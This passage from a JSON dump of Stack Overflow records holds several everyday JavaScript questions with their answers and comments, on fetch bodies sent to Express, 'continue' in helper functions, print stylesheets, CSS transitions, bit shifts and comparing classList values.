"https://i.stack.imgur.com/W6l0W.png?s=128&g=1", "display_name": "Jason", "link": "https://stackoverflow.com/users/481248/jason"}, "edited": false, "score": 0, "creation_date": 1558564155, "post_id": 56265780, "comment_id": 99147839, "body": "Is there an issue of overflow in either case?"}, {"owner": {"reputation": 11633, "user_id": 34806, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d07730fff34f9fff3cbf1c72d5dfe74a?s=128&d=identicon&r=PG", "display_name": "Dexygen", "link": "https://stackoverflow.com/users/34806/dexygen"}, "edited": false, "score": 0, "creation_date": 1558565067, "post_id": 56265780, "comment_id": 99148051, "body": "Questions asking opinions are close-able for the reason that they are primarily opinion based"}], "answers": [{"comments": [{"owner": {"reputation": 2797, "user_id": 2413043, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/VFHPk.jpg?s=128&g=1", "display_name": "amenthes", "link": "https://stackoverflow.com/users/2413043/amenthes"}, "edited": false, "score": 0, "creation_date": 1587335717, "post_id": 56265946, "comment_id": 108465188, "body": "The link is also not about JavaScript, and I would doubt that this transfers to a language on a level this abstract."}], "tags": [], "owner": {"reputation": 304, "user_id": 11467301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26f79ba9e117ea8e7d9fb636092f9f02?s=128&d=identicon&r=PG&f=1", "display_name": "Sina", "link": "https://stackoverflow.com/users/11467301/sina"}, "is_accepted": false, "score": 1, "last_activity_date": 1558636328, "last_edit_date": 1558636328, "creation_date": 1558565408, "answer_id": 56265946, "question_id": 56265780, "link": "https://stackoverflow.com/questions/56265780/is-it-more-conventional-to-write-ab1-instead-of-ab2-in-javascript/56265946#56265946", "title": "is it more conventional to write (a&amp;b)&lt;&lt;1 instead of (a&amp;b)*2 in JavaScript?", "body": "<p>BINARY SHIFT Left and Right are simpler processes in terms of algorithm than multiplication and may take fewer clock-cycles. Check here <a href=\"https://softwareengineering.stackexchange.com/questions/234967/speeds-of-multiplication-and-division\">speeds of &lt;&lt; >> multiplication and division</a></p>\n"}], "owner": {"reputation": 19, "user_id": 8835362, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-r8irQwmvS8o/AAAAAAAAAAI/AAAAAAAAAN8/j53nvXofyw8/photo.jpg?sz=128", "display_name": "Adrian", "link": "https://stackoverflow.com/users/8835362/adrian"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "closed_date": 1558636729, "answer_count": 1, "score": -1, "last_activity_date": 1558636328, "creation_date": 1558563971, "last_edit_date": 1558564750, "question_id": 56265780, "link": "https://stackoverflow.com/questions/56265780/is-it-more-conventional-to-write-ab1-instead-of-ab2-in-javascript", "closed_reason": "Opinion-based", "title": "is it more conventional to write (a&amp;b)&lt;&lt;1 instead of (a&amp;b)*2 in JavaScript?", "body": "<p>Is it more conventional to write <code>(a&amp;b)&lt;&lt;1</code> instead of <code>(a&amp;b)*2</code> in JavaScript?</p>\n\n<p>Just curious to get people's opinion. I'd say the first because it stays in the context of bit operators.</p>\n\n<p>Example:</p>\n\n<pre><code>getSum=g=(a,b)=&gt;a?g((a&amp;b)*2,a^b):b\n</code></pre>\n"}, {"tags": ["javascript", "node.js", "express", "fetch"], "answers": [{"comments": [{"owner": {"reputation": 1806, "user_id": 2689562, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/AfQdF.jpg?s=128&g=1", "display_name": "chidimo", "link": "https://stackoverflow.com/users/2689562/chidimo"}, "edited": false, "score": 0, "creation_date": 1558564212, "post_id": 56265802, "comment_id": 99147859, "body": "I tried that. But with <code>application&#47;json</code> the browser complains of <code>cors</code>."}, {"owner": {"reputation": 49, "user_id": 5709465, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-7HZlCMuGLaU/AAAAAAAAAAI/AAAAAAAACS4/5qgRtbUfQ6M/photo.jpg?sz=128", "display_name": "Fabian Enrique Gutierrez", "link": "https://stackoverflow.com/users/5709465/fabian-enrique-gutierrez"}, "reply_to_user": {"reputation": 1806, "user_id": 2689562, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/AfQdF.jpg?s=128&g=1", "display_name": "chidimo", "link": "https://stackoverflow.com/users/2689562/chidimo"}, "edited": false, "score": 0, "creation_date": 1558564323, "post_id": 56265802, "comment_id": 99147891, "body": "That means that you need to add the cors npm module, you can use app.use(cors(&quot;*&quot;)), for a quick fix but that&#39;s not a best practice. check the module docs and add a proper config"}, {"owner": {"reputation": 49, "user_id": 5709465, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-7HZlCMuGLaU/AAAAAAAAAAI/AAAAAAAACS4/5qgRtbUfQ6M/photo.jpg?sz=128", "display_name": "Fabian Enrique Gutierrez", "link": "https://stackoverflow.com/users/5709465/fabian-enrique-gutierrez"}, "reply_to_user": {"reputation": 1806, "user_id": 2689562, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/AfQdF.jpg?s=128&g=1", "display_name": "chidimo", "link": "https://stackoverflow.com/users/2689562/chidimo"}, "edited": false, "score": 0, "creation_date": 1558564434, "post_id": 56265802, "comment_id": 99147907, "body": "you need to add at least &quot;*&quot; inside the brackets."}, {"owner": {"reputation": 1806, "user_id": 2689562, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/AfQdF.jpg?s=128&g=1", "display_name": "chidimo", "link": "https://stackoverflow.com/users/2689562/chidimo"}, "edited": false, "score": 0, "creation_date": 1558564644, "post_id": 56265802, "comment_id": 99147973, "body": "Sure. Adding the star worked. Now the form data is being read. Thanks and accepted. I always thought cors was enabled the way it is."}, {"owner": {"reputation": 49, "user_id": 5709465, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-7HZlCMuGLaU/AAAAAAAAAAI/AAAAAAAACS4/5qgRtbUfQ6M/photo.jpg?sz=128", "display_name": "Fabian Enrique Gutierrez", "link": "https://stackoverflow.com/users/5709465/fabian-enrique-gutierrez"}, "reply_to_user": {"reputation": 1806, "user_id": 2689562, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/AfQdF.jpg?s=128&g=1", "display_name": "chidimo", "link": "https://stackoverflow.com/users/2689562/chidimo"}, "edited": false, "score": 1, "creation_date": 1558564703, "post_id": 56265802, "comment_id": 99147985, "body": "Always check the documentation carefully before to use a module, this will save your time ;)"}], "tags": [], "owner": {"reputation": 49, "user_id": 5709465, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-7HZlCMuGLaU/AAAAAAAAAAI/AAAAAAAACS4/5qgRtbUfQ6M/photo.jpg?sz=128", "display_name": "Fabian Enrique Gutierrez", "link": "https://stackoverflow.com/users/5709465/fabian-enrique-gutierrez"}, "is_accepted": true, "score": 0, "last_activity_date": 1558564142, "creation_date": 1558564142, "answer_id": 56265802, "question_id": 56265776, "link": "https://stackoverflow.com/questions/56265776/how-to-send-body-to-express-app-with-fetch/56265802#56265802", "title": "How to send body to express app with fetch", "body": "<p>Why not use <code>'Content-Type': 'application/json'</code> instead? don't forget to use <code>body: JSON.stringify(body)</code> before send your data</p>\n"}], "owner": {"reputation": 1806, "user_id": 2689562, "user_type": "registered", "accept_rate": 47, "profile_image": "https://i.stack.imgur.com/AfQdF.jpg?s=128&g=1", "display_name": "chidimo", "link": "https://stackoverflow.com/users/2689562/chidimo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 30, "favorite_count": 0, "accepted_answer_id": 56265802, "answer_count": 1, "score": -1, "last_activity_date": 1558564142, "creation_date": 1558563942, "question_id": 56265776, "link": "https://stackoverflow.com/questions/56265776/how-to-send-body-to-express-app-with-fetch", "title": "How to send body to express app with fetch", "body": "<p>I am trying to post a form using javascript to an express API endpoint</p>\n\n<pre><code>import express from 'express';\nimport path from 'path';\nimport cookieParser from 'cookie-parser';\nimport logger from 'morgan';\nimport dotenv from 'dotenv';\nimport validator from 'express-validator';\nimport cors from 'cors';\n\nimport indexRouter from './routes/index';\n\ndotenv.config();\nconst app = express();\n\napp.use(logger('dev'));\napp.use(express.json());\napp.use(express.urlencoded({ extended: true }));\napp.use(cookieParser());\napp.use(express.static(path.join(__dirname, 'public')));\napp.use(validator());\napp.use(cors());\n\napp.use('/', indexRouter);\n\nexport default app;\n</code></pre>\n\n<p>Here is my form event handler</p>\n\n<pre><code>signin_form.addEventListener('submit', e =&gt; {\n    e.preventDefault();\n    const email = document.getElementById('signin_email').value;\n    const password = document.getElementById('signin_password').value;\n    console.log('SIGN IN', email, password);\n\n    const body = { email, password };\n    console.log(body);\n\n    const options = {\n        method: 'POST',\n        body,\n        headers: { \n            'Access-Control-Allow-Origin': '*',\n            'Content-Type': 'application/x-www-form-urlencoded',\n        },\n    };\n    fetch(signinEndpoint, options)\n        .then(response =&gt; response.json())\n        .then(resp =&gt; {\n            console.log('response ', resp);\n        });\n});\n</code></pre>\n\n<p>When I submit the form directly with the action method, everything works fine. But when I try to handle the submit event by myself, the sent email and password always return undefined.</p>\n\n<p>I have tried almost every suggestion here on SO. I've used <code>FormData()</code>. When I log <code>req.body</code> on my console I get </p>\n\n<pre><code>   '\"email\"\\r\\n\\r\\nperson@gmail.com\\r\\n-----------------------------3902153292\\r\\nContent-Disposition: form-data; name=\"password\"\\r\\n\\r\\ngaatatra\\r\\n-----------------------------3902153292--\\r\\n' }\n</code></pre>\n\n<p>If I try to use <code>'Content-Type': 'application/json'</code>, the browser throws up <code>cors</code> complaints.</p>\n\n<p>If I use <code>JSON.stringify(body)</code>, console.log returns <code>{ '{\"email\":\"person@gmail.com\",\"password\":\"taeatertrt\"}': '' }</code></p>\n\n<p>Any help would be appreciated.</p>\n"}, {"tags": ["javascript", "for-loop", "google-apps-script"], "comments": [{"owner": {"reputation": 23873, "user_id": 1595451, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/08TCi.jpg?s=128&g=1", "display_name": "Rub&#233;n", "link": "https://stackoverflow.com/users/1595451/rub%c3%a9n"}, "edited": false, "score": 1, "creation_date": 1558584566, "post_id": 56265722, "comment_id": 99151459, "body": "On Google Apps Script &quot;custom function&quot; usually refers to Google Sheets user defined functions. Ref. <a href=\"https://developers.google.com/apps-script/guides/sheets/functions\" rel=\"nofollow noreferrer\">developers.google.com/apps-script/guides/sheets/functions</a>"}], "answers": [{"tags": [], "owner": {"reputation": 28753, "user_id": 371184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cebee1b08fb960edf79a359af330391a?s=128&d=identicon&r=PG", "display_name": "Mike Cluck", "link": "https://stackoverflow.com/users/371184/mike-cluck"}, "is_accepted": true, "score": 2, "last_activity_date": 1558563895, "creation_date": 1558563895, "answer_id": 56265768, "question_id": 56265722, "link": "https://stackoverflow.com/questions/56265722/inserting-continue-statement-within-a-function-to-be-called-later-in-another-f/56265768#56265768", "title": "Inserting &#39;continue&#39; statement within a function to be called later in another functions &#39;For loop&#39; statement", "body": "<p>Nope, you have to directly <code>continue</code> inside of the <code>for</code> loop. You could make your function return a boolean then perform a <code>continue</code> as needed.</p>\n\n<pre><code>function example1() {\n  return shouldLoopContinue; // Add your own logic here\n}\n\nfunction example2() {\n  for (var x = 1; x &lt;= 2; x++) {\n    if (example1()) {\n      continue;\n    }\n\n    doSomeOtherWork();\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 89, "user_id": 11541818, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-JDk6aaaTvh0/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rethNPrF-3TSQ11FJxQO18YWqssGQ/mo/photo.jpg?sz=128", "display_name": "Braydon", "link": "https://stackoverflow.com/users/11541818/braydon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 43, "favorite_count": 0, "accepted_answer_id": 56265768, "answer_count": 1, "score": 3, "last_activity_date": 1558584494, "creation_date": 1558563615, "last_edit_date": 1558584494, "question_id": 56265722, "link": "https://stackoverflow.com/questions/56265722/inserting-continue-statement-within-a-function-to-be-called-later-in-another-f", "title": "Inserting &#39;continue&#39; statement within a function to be called later in another functions &#39;For loop&#39; statement", "body": "<p>To simplify my code, I have made a function that contains an 'if' statement. The function is meant to be called within a 'For' loop in another function. I want to put a 'continue' statement inside the custom function to be called later. Is there any possible way to do this without error? Code is written in Google Apps Script.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>function example1() {\r\n  //code here\r\n  continue;\r\n  }\r\n}\r\n        \r\nfunction example2() { \r\n  for(var x = 1 ; x &lt;= 2 ; x++) {\r\n  example1();\r\n  }\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>I get an error for calling the 'continue' statement within the example1() function because the 'continue' statement is not in a 'For' loop. But the example1() function is only created to be called within the example2() 'For' loop statement.</p>\n"}, {"tags": ["javascript", "css"], "comments": [{"owner": {"reputation": 28753, "user_id": 371184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cebee1b08fb960edf79a359af330391a?s=128&d=identicon&r=PG", "display_name": "Mike Cluck", "link": "https://stackoverflow.com/users/371184/mike-cluck"}, "edited": false, "score": 1, "creation_date": 1558563642, "post_id": 56265699, "comment_id": 99147725, "body": "Loading two stylesheets like what you&#39;re doing should work. If you aren&#39;t seeing the result you want, it has to do with your CSS."}, {"owner": {"reputation": 10669, "user_id": 3684265, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/4f365ab1670c41f5e966ef9abecf9903?s=128&d=identicon&r=PG", "display_name": "imvain2", "link": "https://stackoverflow.com/users/3684265/imvain2"}, "edited": false, "score": 0, "creation_date": 1558563663, "post_id": 56265699, "comment_id": 99147729, "body": "Are you pointing to the CSS in the proper folder? If so, then the problem is in your CSS."}, {"owner": {"reputation": 3, "user_id": 7403426, "user_type": "registered", "profile_image": "https://graph.facebook.com/1292157980845378/picture?type=large", "display_name": "Rifki Kurniawan", "link": "https://stackoverflow.com/users/7403426/rifki-kurniawan"}, "reply_to_user": {"reputation": 28753, "user_id": 371184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cebee1b08fb960edf79a359af330391a?s=128&d=identicon&r=PG", "display_name": "Mike Cluck", "link": "https://stackoverflow.com/users/371184/mike-cluck"}, "edited": false, "score": 0, "creation_date": 1558567602, "post_id": 56265699, "comment_id": 99148601, "body": "@MikeCluck yeah it is. for some reason it work when i make new css and put in in css folder and call it inside index head instead using style.  also using media=print works too when first only with style but decided using custom.css to clean up space"}], "answers": [{"comments": [{"owner": {"reputation": 10321, "user_id": 215552, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26bda02894d869c95f620de4b7cd386d?s=128&d=identicon&r=PG", "display_name": "Heretic Monkey", "link": "https://stackoverflow.com/users/215552/heretic-monkey"}, "edited": false, "score": 1, "creation_date": 1558563917, "post_id": 56265724, "comment_id": 99147789, "body": "Or use the <code>@media print</code> at-rule in the CSS files themselves. However, the <code>media</code> attribute defaults to &quot;all&quot;, so without it, the styles should still be picked up by the browser."}, {"owner": {"reputation": 3, "user_id": 7403426, "user_type": "registered", "profile_image": "https://graph.facebook.com/1292157980845378/picture?type=large", "display_name": "Rifki Kurniawan", "link": "https://stackoverflow.com/users/7403426/rifki-kurniawan"}, "edited": false, "score": 0, "creation_date": 1558567745, "post_id": 56265724, "comment_id": 99148622, "body": "this save lot of work. decide to make the style into css to clean up space"}], "tags": [], "owner": {"reputation": 49, "user_id": 5709465, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-7HZlCMuGLaU/AAAAAAAAAAI/AAAAAAAACS4/5qgRtbUfQ6M/photo.jpg?sz=128", "display_name": "Fabian Enrique Gutierrez", "link": "https://stackoverflow.com/users/5709465/fabian-enrique-gutierrez"}, "is_accepted": true, "score": 1, "last_activity_date": 1558563644, "last_edit_date": 1558563644, "creation_date": 1558563629, "answer_id": 56265724, "question_id": 56265699, "link": "https://stackoverflow.com/questions/56265699/how-to-use-2-css-at-the-same-time-when-printing-with-javascript/56265724#56265724", "title": "How to use 2 CSS at the same time when printing with JavaScript", "body": "<p>What you need is to use the </p>\n\n<pre><code>&lt;link rel=\"stylesheet\" href=\"print-style.css\" type=\"text/css\" media=\"print\" /&gt;\n</code></pre>\n\n<p>Notice the <code>media=\"print\"</code>?</p>\n\n<p>This is a special tag for css files that controls styling, you don't need to use JavaScript at all.</p>\n"}], "owner": {"reputation": 3, "user_id": 7403426, "user_type": "registered", "profile_image": "https://graph.facebook.com/1292157980845378/picture?type=large", "display_name": "Rifki Kurniawan", "link": "https://stackoverflow.com/users/7403426/rifki-kurniawan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 41, "favorite_count": 0, "accepted_answer_id": 56265724, "answer_count": 1, "score": -1, "last_activity_date": 1558564324, "creation_date": 1558563429, "last_edit_date": 1558564324, "question_id": 56265699, "link": "https://stackoverflow.com/questions/56265699/how-to-use-2-css-at-the-same-time-when-printing-with-javascript", "title": "How to use 2 CSS at the same time when printing with JavaScript", "body": "<p>I need to print a table id which inside is using bootstrap CSS for the table border etc., and make a style tag for customize table for no-border on specific cells.</p>\n\n<p>My question is how do I use 2 CSS files at the same time so my customized CSS works too, because by adding them 2 at the same time doesn't seem to be working in my case.</p>\n\n<pre><code>&lt;script&gt;\n  function printData(){\n   var divToPrint=document.getElementById(\"example2\");\n   newWin= window.open(\"\", \"width=480, height=720\");\n   newWin.document.write('&lt;html&gt;&lt;head&gt;');\n   newWin.document.write('&lt;link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css\" type=\"text/css\" /&gt;');\n    newWin.document.write('&lt;link rel=\"stylesheet\" href=\"custom.css\" type=\"text/css\" /&gt;');\n    newWin.document.write('&lt;/head&gt;&lt;body&gt;');\n    newWin.document.write(divToPrint.outerHTML);\n    newWin.document.write('&lt;/body&gt;&lt;/html&gt;');\n    newWin.document.close();\n      setTimeout(function(){ newWin.print(); newWin.close(); },500);\n      return true;\n}\n\n$('#pronts').on('click',function(){\nprintData();\n})\n&lt;/script&gt;\n</code></pre>\n\n<p>I expect my table showing with a no border on specific cells when printing</p>\n"}, {"tags": ["javascript", "css", "css-transitions"], "answers": [{"comments": [{"owner": {"reputation": 177576, "user_id": 8620333, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WSmLn.png?s=128&g=1", "display_name": "Temani Afif", "link": "https://stackoverflow.com/users/8620333/temani-afif"}, "edited": false, "score": 0, "creation_date": 1558563404, "post_id": 56265684, "comment_id": 99147649, "body": "it&#39;s more suitable to close the question as <i>simple typo error</i>"}, {"owner": {"reputation": 1407, "user_id": 5919154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca0f83c18e982b8675e9ba617307194e?s=128&d=identicon&r=PG&f=1", "display_name": "nathan.medz", "link": "https://stackoverflow.com/users/5919154/nathan-medz"}, "reply_to_user": {"reputation": 177576, "user_id": 8620333, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WSmLn.png?s=128&g=1", "display_name": "Temani Afif", "link": "https://stackoverflow.com/users/8620333/temani-afif"}, "edited": false, "score": 0, "creation_date": 1558563784, "post_id": 56265684, "comment_id": 99147758, "body": "@TemaniAfif I totally disagree. If he was confused enough to post this as a question then I doubt closing it as a typo would help him understand why his code wasn&#39;t working."}, {"owner": {"reputation": 177576, "user_id": 8620333, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WSmLn.png?s=128&g=1", "display_name": "Temani Afif", "link": "https://stackoverflow.com/users/8620333/temani-afif"}, "edited": false, "score": 0, "creation_date": 1558564114, "post_id": 56265684, "comment_id": 99147829, "body": "so how would you describe a <i>simple typo error</i> question? ... closing the question will also help him because he will know that he faced a simple typo error like you have answered"}, {"owner": {"reputation": 1407, "user_id": 5919154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca0f83c18e982b8675e9ba617307194e?s=128&d=identicon&r=PG&f=1", "display_name": "nathan.medz", "link": "https://stackoverflow.com/users/5919154/nathan-medz"}, "reply_to_user": {"reputation": 177576, "user_id": 8620333, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WSmLn.png?s=128&g=1", "display_name": "Temani Afif", "link": "https://stackoverflow.com/users/8620333/temani-afif"}, "edited": false, "score": 2, "creation_date": 1558564321, "post_id": 56265684, "comment_id": 99147889, "body": "@TemaniAfif I would consider a simple typo error something like a misspelled css selector. I see this as different because not including units is valid for some css attributes (flex) or in some cases (0), just not this one."}, {"owner": {"reputation": 177576, "user_id": 8620333, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WSmLn.png?s=128&g=1", "display_name": "Temani Afif", "link": "https://stackoverflow.com/users/8620333/temani-afif"}, "edited": false, "score": 0, "creation_date": 1558565739, "post_id": 56265684, "comment_id": 99148215, "body": "well, this is the true story of SO, we vote to close good questions because we don&#39;t understand them (ex: <a href=\"https://stackoverflow.com/q/56186202/8620333\">stackoverflow.com/q/56186202/8620333</a>) and we answer/upvote <i>typo</i> questions instead of educating user on how to read the doc, debug code, check the console, etc, etc. let&#39;s hope we won&#39;t have a third question about the same code (the first one here: <a href=\"https://stackoverflow.com/q/56264553/8620333\">stackoverflow.com/q/56264553/8620333</a>)"}, {"owner": {"reputation": 127, "user_id": 5496263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l41hk.jpg?s=128&g=1", "display_name": "Fernando", "link": "https://stackoverflow.com/users/5496263/fernando"}, "edited": false, "score": 1, "creation_date": 1558579909, "post_id": 56265684, "comment_id": 99150692, "body": "@nathan.medz Thanks a lot! It really wanst something I forget, I just thought I could use without the &#39;px&#39;, since it worked ok, except for the transition."}, {"owner": {"reputation": 127, "user_id": 5496263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l41hk.jpg?s=128&g=1", "display_name": "Fernando", "link": "https://stackoverflow.com/users/5496263/fernando"}, "reply_to_user": {"reputation": 177576, "user_id": 8620333, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WSmLn.png?s=128&g=1", "display_name": "Temani Afif", "link": "https://stackoverflow.com/users/8620333/temani-afif"}, "edited": false, "score": 0, "creation_date": 1558580332, "post_id": 56265684, "comment_id": 99150777, "body": "@TemaniAfif, what &quot;voting to close good questions because we don&#39;t understand them&quot; has to do with the fact of answering a question that YOU think it was a typo one? And what&#39;s the problem of having two different questions about the same part of the code? I am asking all of this to know if I really made any mistake."}], "tags": [], "owner": {"reputation": 1407, "user_id": 5919154, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca0f83c18e982b8675e9ba617307194e?s=128&d=identicon&r=PG&f=1", "display_name": "nathan.medz", "link": "https://stackoverflow.com/users/5919154/nathan-medz"}, "is_accepted": true, "score": 3, "last_activity_date": 1558563310, "creation_date": 1558563310, "answer_id": 56265684, "question_id": 56265624, "link": "https://stackoverflow.com/questions/56265624/how-to-make-an-element-slide-up-the-page-smoothly/56265684#56265684", "title": "How to make an element slide up the page smoothly?", "body": "<p>So close! All you were missing was the 'px' on your .converter class bottom attribute. Because -200 isn't a valid bottom, you were going from an unset bottom to 0px, which cant be animated/ transitioned.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>window.addEventListener('scroll', function() {\r\n\r\n  var scroll = window.pageYOffset || document.documentElement.scrollTop;\r\n\r\n  var element = document.querySelector(\".converter\");\r\n\r\n  if (scroll &gt;= 400) {\r\n    element.classList.add(\"atcbottomactive\");\r\n  } else {\r\n    element.classList.remove(\"atcbottomactive\");\r\n  }\r\n\r\n});</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.converter {\r\n\tposition: fixed; \r\n\theight: 60px; \r\n\twidth: 100%; \r\n\tbottom: -200px; \r\n\tbackground: red; \r\n\ttransition: 1s;\r\n\tz-index: 10000;\r\n}\r\n\r\n.ccontent {\r\n\tdisplay: inline-flex;\r\n\twidth: 100%;\r\n\tpadding: 10px 5%;\r\n}\r\n\r\n.atcbottomactive{\r\n\tbottom:0;\r\n\ttransition: 1s;\r\n}\r\n\r\n.page {\r\n  background: green;\r\n  height: 1500px;\r\n  width: 100%;\r\n }</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;div class=\"page\"&gt;Scroll me: 400px&lt;/div&gt;\r\n&lt;div class=\"converter\"&gt;\r\n  &lt;div class=\"ccontent\"&gt;&lt;/div&gt;\r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 127, "user_id": 5496263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/l41hk.jpg?s=128&g=1", "display_name": "Fernando", "link": "https://stackoverflow.com/users/5496263/fernando"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "accepted_answer_id": 56265684, "answer_count": 1, "score": 1, "last_activity_date": 1558563310, "creation_date": 1558562910, "question_id": 56265624, "link": "https://stackoverflow.com/questions/56265624/how-to-make-an-element-slide-up-the-page-smoothly", "title": "How to make an element slide up the page smoothly?", "body": "<p>I have the following code that contains positioned hidden div (.converter) and I use JS to make it slide up and down based on the user's scroll. But I would like to make it smoothly and I thought transition would do the job.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>window.addEventListener('scroll', function() {\r\n\r\n  var scroll = window.pageYOffset || document.documentElement.scrollTop;\r\n\r\n  var element = document.querySelector(\".converter\");\r\n\r\n  if (scroll &gt;= 400) {\r\n    element.classList.add(\"atcbottomactive\");\r\n  } else {\r\n    element.classList.remove(\"atcbottomactive\");\r\n  }\r\n\r\n});</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.converter {\r\n\tposition: fixed; \r\n\theight: 60px; \r\n\twidth: 100%; \r\n\tbottom: -200; \r\n\tbackground: red; \r\n\ttransition: 1s;\r\n\tz-index: 10000;\r\n}\r\n\r\n.ccontent {\r\n\tdisplay: inline-flex;\r\n\twidth: 100%;\r\n\tpadding: 10px 5%;\r\n}\r\n\r\n.atcbottomactive{\r\n\tbottom:0;\r\n\ttransition: 1s;\r\n}\r\n\r\n.page {\r\n  background: green;\r\n  height: 1500px;\r\n  width: 100%;\r\n }</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;div class=\"page\"&gt;Scroll me: 400px&lt;/div&gt;\r\n&lt;div class=\"converter\"&gt;\r\n  &lt;div class=\"ccontent\"&gt;&lt;/div&gt;\r\n&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Thanks in advance</p>\n"}, {"tags": ["javascript"], "comments": [{"owner": {"reputation": 14807, "user_id": 6870228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13425c63b585e3bba05d30509e9e2b00?s=128&d=identicon&r=PG&f=1", "display_name": "Keith", "link": "https://stackoverflow.com/users/6870228/keith"}, "edited": false, "score": 0, "creation_date": 1558563051, "post_id": 56265599, "comment_id": 99147566, "body": "<code>classList</code> is an object, it&#39;s not going to be the same between two element,.  You could maybe try <code>classList.value</code> instead.  Although do take note if you had a class as  <code>class1 class2</code>  &amp; <code>class2 class1</code>, it would still be false, when you might want it to be true."}], "answers": [{"tags": [], "owner": {"reputation": 40275, "user_id": 3744304, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/17uwe.jpg?s=128&g=1", "display_name": "connexo", "link": "https://stackoverflow.com/users/3744304/connexo"}, "is_accepted": false, "score": 3, "last_activity_date": 1558564922, "last_edit_date": 1558564922, "creation_date": 1558564296, "answer_id": 56265821, "question_id": 56265599, "link": "https://stackoverflow.com/questions/56265599/trying-to-compare-classes-of-different-elements/56265821#56265821", "title": "Trying to compare classes of different elements", "body": "<p>Use <em>Array spread</em> <code>[...classList]</code> to make the <code>classList</code> an <code>Array</code>, then check if every member is contained in the <code>classList</code> of the other using <code>Array.prototype.every()</code>.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>function sameClassList({classList: x},{classList: y}) {\r\n  return [...x].every(z=&gt;y.contains(z)) \r\n    &amp;&amp; [...y].every(z=&gt;x.contains(z));\r\n}\r\n\r\nconsole.log(sameClassList(a,b)); // true\r\nconsole.log(sameClassList(a,c)); // false\r\nconsole.log(sameClassList(b,c)); // false</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;div class=\"foo bar\" id=\"a\"&gt;&lt;/div&gt;\r\n&lt;div class=\"bar foo\" id=\"b\"&gt;&lt;/div&gt;\r\n&lt;div class=\"foo bar baz\" id=\"c\"&gt;&lt;/div&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": [], "owner": {"reputation": 1590, "user_id": 1293709, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/9e554f12328072592520e18fd07036dd?s=128&d=identicon&r=PG", "display_name": "Thomas Hirsch", "link": 